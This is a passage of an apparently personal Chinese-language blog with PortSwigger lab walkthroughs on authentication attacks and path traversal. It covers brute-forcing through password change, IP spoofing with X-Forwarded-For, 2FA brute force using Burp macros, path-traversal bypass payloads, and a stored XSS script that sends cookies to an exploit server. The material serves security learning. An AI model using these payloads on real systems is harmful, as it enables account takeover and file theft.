<h2 id="3-4-Changing-user-passwords"><a href="#3-4-Changing-user-passwords" class="headerlink" title="3.4 Changing user passwords"></a>3.4 Changing user passwords</h2><p>通常，更改密码需要输入当前密码，然后两次输入新密码。这些页面基本上依赖于与普通登录页面相同的流程来检查用户名和当前密码是否匹配。因此，这些页面可能会受到相同技术的攻击。如果密码更改功能允许攻击者直接在未以受害者用户身份登录的情况下访问它，那么它可能会特别危险。例如，如果用户名是在隐藏字段中提供的，攻击者可能会在请求中编辑此值以针对任意用户。这可能会被利用来枚举用户名和暴力破解密码。</p>
<h3 id="3-4-1-Lab-Password-brute-force-via-password-change"><a href="#3-4-1-Lab-Password-brute-force-via-password-change" class="headerlink" title="3.4.1 Lab: Password brute-force via password change"></a>3.4.1 Lab: Password brute-force via password change</h3><p>这个实验室的密码修改功能很容易受到暴力攻击。要破解实验室，使用候选密码列表来破解卡洛斯的账户，并进入他的“我的账户”页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p>&#x3D;&#x3D;（并不是冲着改密码去的有referer头，重放不了，是去爆破密码的，因为可以基于错误判断）&#x3D;&#x3D;</p>
<ul>
<li><img src="/images/image-20251116165748-msmsk3b.png" alt="image"></li>
</ul>
<p><img src="/images/image-20251116165726-u1ybcds.png" alt="image"></p>
<h1 id="5-LAB"><a href="#5-LAB" class="headerlink" title="5.LAB:"></a>5.LAB:</h1><h2 id="Lab-Username-enumeration-via-response-timing"><a href="#Lab-Username-enumeration-via-response-timing" class="headerlink" title="Lab: Username enumeration via response timing"></a>Lab: Username enumeration via response timing</h2><p>直接爆破会被封IP——确定“X-Forwarded-For”头是受支持的，这使您可以欺骗您的IP地址，并绕过基于IP的暴力保护。</p>
<p><img src="/images/image-20251115125349-l268pwu.png" alt="image"></p>
<ol>
<li><p>尝试用户名和密码。特别要注意响应时间。请注意，当用户名无效时，响应时间大致相同。然而，当您输入有效的用户名（您自己的用户名）时，响应时间会根据您输入的长度而增加。</p>
</li>
<li><p>将此请求发送到Burp Intruder，并从攻击类型下拉菜单中选择“Pitchfork”攻击。添加“X-Forwarded-For”头。</p>
</li>
<li><p>为“X-Forwarded-For”头和用户名参数添加有效负载位置。将密码设置为一个非常长的字符字符串（大约100个字符应该可以）。</p>
</li>
<li><p>在“有效负载”侧边栏中，从“有效负载位置”下拉列表中选择位置1。选择“数字”有效负载类型。输入1-100的范围，并将步进设置为1。将最大小数位数设置为0。这将用于欺骗您的IP。</p>
</li>
<li><p>从“有效负载位置”下拉列表中选择位置2，然后添加用户名列表。开始攻击。</p>
</li>
<li><p>攻击完成后，在对话框的顶部，单击“列”，然后选择“接收到的响应”和“完成的响应”选项。这两列现在显示在结果表中。</p>
</li>
<li><p>请注意，其中一个响应时间明显比其他响应时间长。重复此请求几次，以确保它始终需要更长时间，然后记下此用户名。</p>
</li>
<li><p>为同一请求创建一个新的Burp Intruder攻击。再次添加“X-Forwarded-For”头，并为它添加一个有效负载位置。插入您刚刚确定的用户名，并为密码参数添加一个有效负载位置。</p>
</li>
<li><p>在“有效负载”侧边栏中，将数字列表添加到有效负载位置1，将密码列表添加到有效负载位置2。开始攻击。</p>
</li>
<li><p>攻击完成后，找到具有302状态的响应。记下此密码。</p>
</li>
<li><p>使用您确定的用户名和密码登录，访问用户帐户页面以解决实验室问题。</p>
</li>
</ol>
<p><img src="/images/image-20251115132119-fpvrynr.png" alt="image"></p>
<h2 id="Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题"><a href="#Lab-Broken-brute-force-protection-IP-block-锁定模式存在问题" class="headerlink" title="Lab: Broken brute-force protection, IP block(锁定模式存在问题)"></a>Lab: Broken brute-force protection, IP block(锁定模式存在问题)</h2><p>可以尝试自己写一个脚本</p>
<p>‍</p>
<p>这个实验室由于其密码暴力保护中的一个逻辑缺陷而容易受到攻击。要解决这个实验室的问题，需要对受害者的密码进行暴力破解，然后登录并访问他们的账户页面。</p>
<p> • 您的凭证：wiener:peter</p>
<p>• 受害者的用户名：carlos • 候选密码</p>
<p>‍</p>
<ol>
<li>在运行 Burp 的情况下，检查登录页面。注意，如果您连续提交 3 次错误的登录信息，您的 IP 地址将被暂时封锁。但是，请注意，在达到此限制之前，您可以通过登录自己的账户来重置失败登录尝试的次数。</li>
<li>输入无效的用户名和密码，然后将 POST &#x2F;login 请求发送到 Burp Intruder。创建一个在用户名和密码参数中都有有效负载位置的 pitchfork 攻击。</li>
<li>单击“Resource pool”以打开“Resource pool”侧边栏，然后将攻击添加到“Maximum concurrent requests”设置为 1 的资源池中。通过一次只发送一个请求，您可以确保您的登录尝试按正确的顺序发送到服务器。</li>
<li>单击“Payloads”以打开“Payloads”侧边栏，然后从“Payload position”下拉列表中选择位置 1。添加一个在您的用户名和 carlos 之间交替的有效负载列表。确保您的用户名排在第一位，并且 carlos 至少重复 100 次。</li>
<li>编辑候选密码列表，并在每个密码之前添加您自己的密码。确保您的密码与另一个列表中的用户名对齐。<br>从“Payload position”下拉列表中选择位置 2，然后添加密码列表。开始攻击。</li>
<li>攻击完成后，过滤结果以隐藏状态码为 200 的响应。按用户名对剩余结果进行排序。应该只有一个用户名为 carlos 的请求的 302 响应。从“Payload 2”列中记下密码。</li>
<li>使用您确定的密码登录 Carlos 的账户，访问他的账户页面以解决实验室问题。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload_username=[]</span><br><span class="line">file=<span class="built_in">open</span>(<span class="string">&quot;username.txt&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    file.write(<span class="string">&quot;carlos\nwiener\n&quot;</span>)    </span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251115171506-5svg0ou.png" alt="image"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">file_path=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\password.txt&quot;</span></span><br><span class="line">output_file=<span class="string">r&quot;C:\Users\xxxxxxx\Desktop\new_password.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> infile,<span class="built_in">open</span>(output_file,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>)<span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> infile:</span><br><span class="line">        outfile.write(line.rstrip(<span class="string">&quot;\n&quot;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        outfile.write(<span class="string">&quot;peter\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">infile.close()</span><br><span class="line">outfile.close()</span><br></pre></td></tr></table></figure>

<p>重点：缺陷模式需要控制发包的顺序——并发速度，而且需要会懂基础的脚本撰写。</p>
<h2 id="Lab-Username-enumeration-via-account-lock"><a href="#Lab-Username-enumeration-via-account-lock" class="headerlink" title="Lab: Username enumeration via account lock"></a>Lab: Username enumeration via account lock</h2><p>网站试图防止暴力破解的一种方法是，如果满足某些可疑条件（通常是登录失败的次数），就锁定帐户。与正常的登录错误一样，来自服务器的指示帐户被锁定的响应也可以帮助攻击者枚举用户名。</p>
<p>‍</p>
<ol>
<li>运行Burp Suite，调查登录页面并提交无效的用户名和密码。将POST &#x2F;login请求发送到Burp Intruder。</li>
<li>从攻击类型下拉菜单中选择“Cluster bomb attack”（集群炸弹攻击）。向用户名参数添加一个有效负载位置。通过单击“Add §”在请求正文的末尾添加一个空白有效负载位置。结果应该看起来像这样：username&#x3D;§invalid-username§&amp;password&#x3D;example§§。</li>
<li>在“Payloads”（有效负载）侧边栏中，为第一个有效负载位置添加用户名列表。对于第二个有效负载位置，选择“Null payloads”（空有效负载）类型，并选择生成5个有效负载的选项。这将有效地使每个用户名重复5次。开始攻击。</li>
<li>在结果中，注意到一个用户名的响应比其他用户名的响应要长。仔细研究响应，注意到它包含一个不同的错误消息：“您输入的登录信息有误”。记下这个用户名。</li>
<li>在POST &#x2F;login请求上创建一个新的Burp Intruder攻击，但这次从攻击类型下拉菜单中选择“Sniper attack”（狙击手攻击）。将用户名参数设置为刚刚确定的用户名，并向密码参数添加一个有效负载位置。</li>
<li>将密码列表添加到有效负载集中，并为错误消息创建一个grep提取规则。开始攻击。</li>
<li>在结果中，查看grep提取列。注意，有几个不同的错误消息，但其中一个响应不包含任何错误消息。记下这个密码。<br>等待一分钟以允许账户锁定重置。使用确定的用户名和密码登录，访问用户账户页面以解决实验室问题。</li>
</ol>
<p><img src="/images/image-20251115173125-ss5bg7t.png" alt="image"></p>
<p><img src="/images/image-20251115173613-78szps8.png" alt="image"></p>
<h2 id="Lab-2FA-simple-bypass"><a href="#Lab-2FA-simple-bypass" class="headerlink" title="Lab: 2FA simple bypass"></a>Lab: 2FA simple bypass</h2><p>这个实验室的双重认证是可以绕过的。您已经获得了有效的用户名和密码，但无法访问用户的2FA验证码。要解决实验室的问题，请访问卡洛斯的账户页面。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s credentials <code>carlos:montoya</code></li>
</ul>
<p>‍</p>
<p>登录到您自己的账户。您的2FA验证码将通过电子邮件发送给您。单击“电子邮件客户端”按钮以访问您的电子邮件。</p>
<p><img src="/images/image-20251115185818-7j4772y.png" alt="image"></p>
<p><img src="/images/image-20251115185915-x9ppfwg.png" alt="image"><br>转到您的账户页面并记下URL。</p>
<p><img src="/images/image-20251115190137-43jvi3e.png" alt="image"><br>注销您的账户。<br>使用受害者的凭据登录。<br>当系统提示输入验证码时，手动更改URL以导航到&#x2F;my-account。页面加载时，实验即告解决。</p>
<p><img src="/images/image-20251115190151-mrbu8dq.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-2FA-bypass-using-a-brute-force-attack"><a href="#Lab-2FA-bypass-using-a-brute-force-attack" class="headerlink" title="Lab: 2FA bypass using a brute-force attack"></a>Lab: 2FA bypass using a brute-force attack</h2><p>网站会在输入错误的验证码后注销用户，但是可以通过宏来自动化登录。</p>
<p>‍</p>
<p>Victim’s credentials: <code>carlos:montoya</code></p>
<p>与密码一样，网站也需要采取措施来防止暴力破解双因素认证验证码。这一点尤为重要，因为验证码通常是一个简单的4位或6位数字。如果没有足够的暴力破解保护，破解这样的代码是微不足道的。</p>
<p>一些网站试图通过在用户输入一定数量的错误验证码后自动将其注销来防止这种情况。但在实践中这是无效的，因为高级攻击者甚至&#x3D;&#x3D;可以通过为Burp Intruder创建宏来自动化这个多步骤过程&#x3D;&#x3D;。Turbo Intruder扩展也可以用于此目的。</p>
<p>这个实验室的双因素认证容易受到暴力攻击。你已经获得了有效的用户名和密码，但没有访问用户的2FA验证码。为了解决这个实验室的问题，对2FA代码进行暴力破解，并访问Carlos的账户页面。</p>
<p>由于验证码将在您运行攻击时重置，因此您可能需要多次重复此攻击才能成功。这是因为新的代码可能是您当前的入侵者攻击已经尝试过的数字。</p>
<p>‍</p>
<p>‍</p>
<ol>
<li>在运行Burp的情况下，以carlos的身份登录并调查2FA验证过程。请注意，如果您两次输入错误的代码，您将再次被注销。您需要使用Burp的会话处理功能，在发送每个请求之前自动登录。</li>
<li>在Burp中，单击“设置”以打开“setting”对话框，然后单击“sessions”。在“session handling rules ”面板中，单击“add”。</li>
</ol>
<p><img src="/images/image-20251115195210-nsjmt2c.png" alt="image"><br>在对话框中，转到“范围”选项卡。在“URL范围”下，选择“包含所有URL”选项。</p>
<p><img src="/images/image-20251115195453-jhs9gl9.png" alt="image"><br>返回“详细信息”选项卡，在“规则操作”下，单击“添加”&gt;“运行宏”。</p>
<p>‍</p>
<p><img src="/images/image-20251115195527-dtwxdif.png" alt="image"><br>在“选择宏”下，单击“添加”以打开“宏记录器”。选择以下3个请求：然后单击“确定”。“宏编辑器”对话框将打开。要按住ctrl键来选择</p>
<p><img src="/images/image-20251115200747-ooqf5yi.png" alt="image"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /login</span><br><span class="line">POST /login</span><br><span class="line">GET /login2</span><br></pre></td></tr></table></figure>

<p>单击“测试宏”，并检查最终响应是否包含要求您提供4位数安全代码的页面。这将确认宏工作正常。</p>
<p><img src="/images/image-20251115201831-7j9gils.png" alt="image">​<br>继续单击“确定”以关闭各个对话框，直到返回Burp主窗口。&#x3D;&#x3D;现在，在Burp Intruder发送每个请求之前，宏将自动为您登录Carlos。&#x3D;&#x3D;</p>
<p>‍</p>
<p>将POST &#x2F;login2请求发送到Burp Intruder。</p>
<p><img src="/images/image-20251115202005-x1u905l.png" alt="image"><br>在Burp Intruder中，向mfa-code参数添加一个有效负载位置。<br>在“有效负载”侧边栏中，选择“数字”有效负载类型。输入范围0 - 9999，并将步进设置为1。将最小&#x2F;最大整数位数设置为4，最大小数位数设置为0。这将为每个可能的4位数整数创建一个有效负载。<br>单击“资源池”以打开“资源池”侧边栏。将攻击添加到“最大并发请求”设置为1的资源池中。<br>开始攻击。最终，其中一个请求将返回302状态代码。右键单击此请求，然后选择“在浏览器中显示响应”。复制URL并在浏览器中加载。</p>
<p><img src="/images/image-20251115202257-m1hnhli.png" alt="image"><br>单击“我的账户”以解决实验室问题。</p>
<p><img src="/images/image-20251115220858-i7bd627.png" alt="image"></p>
<h2 id="Lab-Offline-password-cracking"><a href="#Lab-Offline-password-cracking" class="headerlink" title="Lab: Offline password cracking"></a>Lab: Offline password cracking</h2><p>本实验室将用户的密码散列存储在cookie中。该实验室在评论功能中还包含一个XSS漏洞。要破解实验室，获取carlos的永久登录cookie并使用它来破解他的密码。然后，以carlos的身份登录，并从“我的帐户”页面删除他的帐户。</p>
<ul>
<li>Your credentials: <code>wiener:peter</code></li>
<li>Victim’s username: <code>carlos</code></li>
</ul>
<p><img src="/images/image-20251116145936-ptopecr.png" alt="image"></p>
<ol>
<li>在运行 Burp 的情况下，使用您自己的账户来检查“保持登录”功能。请注意，保持登录的 cookie 是经过 Base64 编码的。<br>在“代理”&gt;“HTTP 历史记录”选项卡中，转到您登录请求的响应，并突出显示“保持登录”cookie，以查看其构造如下：username ‘:’ md5HashOfPassword</li>
</ol>
<p><img src="/images/image-20251116150256-4292dx5.png" alt="image"></p>
<ol start="2">
<li>您现在需要窃取受害者用户的 cookie。请注意，评论功能容易受到 XSS 攻击。<br>记下回传的地址：<a target="_blank" rel="noopener" href="https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/">https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/</a></li>
<li>转到其中一个博客，并发布一个包含以下存储型 XSS 有效负载的评论，请记住输入您自己的攻击服务器 ID：</li>
</ol>
<p>​<code>&lt;script&gt;document.location=&#39;https://exploit-0a85001a0416728c80b92a9601d100df.exploit-server.net/exploit&#39;+document.cookie</code></script></p>
<p><img src="/images/image-20251116151923-b4xjyy3.png" alt="image"><br>在攻击服务器上，打开访问日志。应该有一个来自受害者的 GET 请求，其中包含他们的“保持登录”cookie。</p>
<p><img src="/images/image-20251116152225-u58re5e.png" alt="image"><br>在 Burp 解码器中解码 cookie。结果将是：carlos:26323c16d5f4dabff3bb136f2460a943<br>复制哈希值并将其粘贴到搜索引擎中。这将显示密码是 onceuponatime。<br>登录受害者的账户，转到“我的账户”页面，然后删除他们的账户以解决实验室问题。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>‍</p>
<p>‍</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" data-id="cmkbf3udr0000ewvs12j9adbg" data-title="2.Authentication身份验证" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-路径遍历" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/" class="article-date">
  <time class="dt-published" datetime="2026-01-07T19:41:15.000Z" itemprop="datePublished">2026-01-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/08/%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86/">1.路径穿越</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2025.12.7</p>
<p>引用链接：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/file-path-traversal">https://portswigger.net/web-security/file-path-traversal</a></p>
<p><a target="_blank" rel="noopener" href="https://hackerone.com/reports/3328367">https://hackerone.com/reports/3328367</a></p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>漏洞原因：将用户提供的输入传递给文件系统API，如果无法避免将用户提供的输入传递给文件系统API，使用两层防御来防止攻击：<br>• 在处理用户输入之前先验证用户输入。理想情况下，将用户输入与允许的值白名单进行比较。如果不可能，请验证输入是否只包含允许的内容，例如仅限字母数字字符。<br>• 在验证提供的输入后，将输入追加到基本目录，并使用平台文件系统API对路径进行规范化。验证规范化路径是否以预期的基本目录开头。以下是基于用户输入验证文件规范化路径的一些简单Java代码示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">File</span> file = <span class="keyword">new</span> <span class="title class_">File</span>(<span class="variable constant_">BASE_DIRECTORY</span>, userInput);</span><br><span class="line"><span class="keyword">if</span> (file.<span class="title function_">getCanonicalPath</span>().<span class="title function_">startsWith</span>(<span class="variable constant_">BASE_DIRECTORY</span>)) &#123;</span><br><span class="line">    <span class="comment">// process file</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下为常见的路径遍历：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实际位置在<code>/var/www/images/218.png</code>穿越到&#x2F;etc&#x2F;passwd：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://insecure-website.com/loadImage?filename=../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h1 id="2-利用路径遍历漏洞的常见障碍"><a href="#2-利用路径遍历漏洞的常见障碍" class="headerlink" title="2.利用路径遍历漏洞的常见障碍"></a>2.利用路径遍历漏洞的常见障碍</h1><p>如果一个应用程序从用户提供的文件名中剥离或阻止目录遍历序列，那么可能会使用多种技术来绕过防御措施。</p>
<h2 id="2-1-嵌套遍历"><a href="#2-1-嵌套遍历" class="headerlink" title="2.1 嵌套遍历"></a>2.1 嵌套遍历</h2><p>嵌套遍历序列，例如….&#x2F;&#x2F;或…./。当剥离内部序列时，这些将恢复为简单的遍历序列。</p>
<ol>
<li><p><strong>应用层过滤的局限性</strong>很多程序会直接扫描输入中的 “..&#x2F;“ 字符串并替换为空，以此阻止路径遍历。&#x3D;&#x3D;但如果输入是嵌套形式，比如 “….&#x2F;&#x2F;“，简单的替换逻辑可能只处理掉一层。例如，将 “….&#x2F;&#x2F;“ 中的一个 “..&#x2F;“ 替换后，剩余的字符会重新组合成新的 “..&#x2F;“，从而绕过过滤。&#x3D;&#x3D;</p>
</li>
<li><p><strong>文件系统的路径规范化</strong>操作系统的文件系统在处理路径时，会自动进行 “规范化” 操作，也就是递归解析所有的 “..&#x2F;“ 和 “.&#x2F;“。无论输入的序列多么复杂，只要最终能组合成有效的上级目录跳转指令，文件系统都会执行。比如：</p>
<ul>
<li>“….&#x2F;&#x2F;“ 会被解析为 “..&#x2F;“ + “..&#x2F;“，即向上跳转两级。</li>
<li>“….&#x2F;“ 可能被解析为 “..&#x2F;“ + “.&#x2F;“，即向上跳转一级。</li>
</ul>
</li>
<li><p><strong>路径解析顺序的差异</strong>攻击的关键就在于利用 “应用层过滤” 和 “文件系统解析” 的顺序差。应用程序先过滤，但没过滤干净；文件系统后解析，把残留的字符组合成有效路径，最终实现了绕过。</p>
</li>
</ol>
<h2 id="2-2-混用正斜杠和反斜杠"><a href="#2-2-混用正斜杠和反斜杠" class="headerlink" title="2.2 混用正斜杠和反斜杠"></a>2.2 混用正斜杠和反斜杠</h2><p><img src="/images/image-20251207121121-gb3pj8u.png" alt="image"></p>
<p>利用反斜杠（\）与正斜杠（&#x2F;）的混用，绕过只检测正斜杠的过滤</p>
<h2 id="2-3-双重URL编码"><a href="#2-3-双重URL编码" class="headerlink" title="2.3 双重URL编码"></a>2.3 双重URL编码</h2><p>对于Burp Suite Professional用户，Burp Intruder提供了预定义的负载列表Fuzzing - path traversal。它包含一些可以尝试的编码路径遍历序列。</p>
<p>在某些情况下，如URL路径或multipart &#x2F; form-data请求的filename参数中，Web服务器可能会在将输入传递给应用程序之前剥离任何目录遍历序列。</p>
<p>有时可以通过URL编码甚至双重URL编码来绕过这种清理，即..&#x2F;字符。这将分别导致%2e%2e%2f 和   %25%2e%25%2e%25%2f<br>各种非标准编码，如..%c0%af  或%8f，也可能有效。</p>
<p>‍</p>
<h3 id="2-3-1-c0-af-的原理："><a href="#2-3-1-c0-af-的原理：" class="headerlink" title="2.3.1 ..%c0%af 的原理："></a>2.3.1 ..%c0%af 的原理：</h3><p>在UTF-8编码中，&#x2F; 的标准编码是 2f (十六进制)。%c0%af 是UTF-8字符集中 非规范的（或称为”过长”） 编码方式来表示 &#x2F; 字符。</p>
<p>清理机制阶段： 清理机制可能只识别并过滤标准编码的 %2f 或未编码的 &#x2F;。当它看到 %c0%af 时，因为这不是标准的 &#x2F; 编码形式，所以无法识别和拦截。</p>
<p>应用程序阶段： 许多现代编程语言和操作系统在处理路径时，底层会调用 UTF-8 解码 函数。这些函数通常被设计为接受并规范化过长的UTF-8表示，因此会将非规范的 %c0%af 正确地解码 为 &#x2F; 字符。最终，输入被还原为 ..&#x2F;，绕过清理。</p>
<h3 id="2-3-2-8f-的原理："><a href="#2-3-2-8f-的原理：" class="headerlink" title="2.3.2 %8f 的原理："></a>2.3.2 %8f 的原理：</h3><p> 这种形式通常是利用 IIS（Microsoft Internet Information Services） Web服务器的特定漏洞。在特定的IIS版本和配置中，IIS可能会将一些非标准的单字节或双字节编码（如 %8f、%e0 等，它们本身并不是合法的UTF-8表示）在处理路径时错误地映射或截断，最终导致 &#x2F; 字符的出现或路径解析错误。</p>
<h2 id="2-4-文件开头"><a href="#2-4-文件开头" class="headerlink" title="2.4 文件开头"></a>2.4 文件开头</h2><p>应用程序可能要求用户提供的文件名以预期的基本文件夹开头，例如&#x2F;var&#x2F;www&#x2F;images在这种情况下，可能包括所需的基本文件夹，然后是合适的遍历序列。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd。</span><br></pre></td></tr></table></figure>

<h2 id="2-5-空字节绕过"><a href="#2-5-空字节绕过" class="headerlink" title="2.5 空字节绕过"></a>2.5 空字节绕过</h2><p>应用程序可能要求用户提供的文件名以预期的文件扩展名结尾，例如.png。在这种情况下，可以使用空字节在所需扩展名之前有效地终止文件路径。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.png</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h1 id="3-一些报告的思路"><a href="#3-一些报告的思路" class="headerlink" title="3.一些报告的思路"></a>3.一些报告的思路</h1><h2 id="3-1-CWE-28-Path-Traversal-‘-filedir"><a href="#3-1-CWE-28-Path-Traversal-‘-filedir" class="headerlink" title="3.1  CWE-28: Path Traversal: ‘..\filedir"></a>3.1  CWE-28: Path Traversal: ‘..\filedir</h2><p>Windows 操作系统或某些网络协议（如 SMB&#x2F;CIFS）的文件路径约定。</p>
<ul>
<li>假设应用程序旨在让用户访问日志目录下的文件，例如 <code>C:\App\Logs\</code>​。用户输入 <code>access.log</code>​。程序拼接后读取 <code>C:\App\Logs\access.log</code>。</li>
<li><strong>攻击行为：</strong>  攻击者在用户输入中注入 Windows 风格的向上遍历序列：​ <strong>​<code>..\..\..\Windows\win.ini</code>​</strong>。</li>
<li>结果： 应用程序将恶意输入与基路径拼接：\text{Full Path} &#x3D; \text{“C:\App\Logs&quot;} + \text{“......\Windows\win.ini”}</li>
</ul>
<p>‍</p>
<h2 id="3-2-CWE-39-Path-Traversal-‘C-dirname’"><a href="#3-2-CWE-39-Path-Traversal-‘C-dirname’" class="headerlink" title="3.2 CWE-39: Path Traversal: ‘C:dirname’"></a>3.2 CWE-39: Path Traversal: ‘C:dirname’</h2><p><strong>利用了 Windows 操作系统处理路径中</strong>盘符（Drive Letter）的特殊机制来绕过安全检查。</p>
<p>假设 Web 应用程序的安全文件根目录位于 <code>D:\WebRoot\data\</code>，并且它只想允许用户访问这个目录下的文件。</p>
<p>攻击者构造一个包含另一个盘符（例如 <code>C:</code>）的输入：</p>
<ul>
<li><strong>攻击者输入：</strong>  <code>C:..\..\..\Windows\win.ini</code></li>
</ul>
<p>应用程序将用户输入与其他参数结合，并进行文件操作。如果它没有检查输入中的盘符：</p>
<ul>
<li><p><strong>应用程序当前工作目录 (CWD)：</strong>  假设应用程序进程的 CWD 正好在 <code>C:\Users\AppUser\</code>。</p>
</li>
<li><p><strong>输入解析：</strong>  当 Windows 看到 <code>C:..\..\..\Windows\win.ini</code> 时，它会将路径解释为：</p>
<ol>
<li>切换到 <code>C:</code> 盘。</li>
<li>从 <code>C:</code>​ 盘的<strong>当前工作目录</strong> (<code>C:\Users\AppUser\</code>​) 开始，应用相对路径 <code>..\..\..\Windows\win.ini</code>。</li>
</ol>
</li>
<li><p><strong>路径遍历：</strong></p>
<ul>
<li><code>..\</code>​ 跳出 <code>AppUser</code> $\rightarrow$ <code>C:\Users\</code></li>
<li><code>..\</code>​ 跳出 <code>Users</code> $\rightarrow$ <code>C:\</code></li>
<li><code>..\</code>​ 停在 <code>C:\</code></li>
<li><strong>最终访问的路径：</strong>  <code>C:\Windows\win.ini</code></li>
</ul>
</li>
</ul>
<h2 id="3-3-CWE-40-Path-Traversal-‘-UNC-share-name-Windows-UNC-Share"><a href="#3-3-CWE-40-Path-Traversal-‘-UNC-share-name-Windows-UNC-Share" class="headerlink" title="3.3  CWE-40: Path Traversal: ‘\UNC\share\name&#39; (Windows UNC Share)"></a>3.3  CWE-40: Path Traversal: ‘\UNC\share\name&#39; (Windows UNC Share)</h2><p>UNC 共享是一种在 <strong>Windows 网络环境</strong>中指定共享资源（如文件、文件夹、打印机）位置的命名约定或格式。它是访问网络资源的<strong>标准语法</strong>。</p>
<p>UNC 路径总是以两个反斜杠 <code>\\</code> 开头，后跟计算机名称，然后是共享资源的名称。</p>
<table>
<thead>
<tr>
<th><strong>组成部分</strong></th>
<th><strong>示例</strong></th>
<th><strong>说明</strong></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>​ <strong>​<code>\\</code>​</strong></td>
<td>​<code>\\</code></td>
<td>必需。表示这是一个 UNC 网络路径。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>ComputerName</code>​</strong></td>
<td>​<code>\\ServerA</code></td>
<td>托管资源的计算机或服务器的​<strong>网络名称</strong>​（NetBIOS Name）或​<strong>IP 地址</strong>。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>ShareName</code>​</strong></td>
<td>​<code>\\ServerA\Projects</code></td>
<td>计算机上<strong>已共享</strong>的文件夹或设备的名称。</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>​<strong>​<code>OptionalPath</code>​</strong></td>
<td>​<code>\\ServerA\Projects\Report.docx</code></td>
<td>共享文件夹内的文件或子文件夹的完整路径。</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>‍</p>
<p>假设一个应用程序有一个名为“文件处理服务”的功能，它接收一个文件名，并预期在本地的临时目录中找到并处理该文件。</p>
<p><strong>应用预期代码逻辑（假设在 Windows 服务器上）：</strong></p>
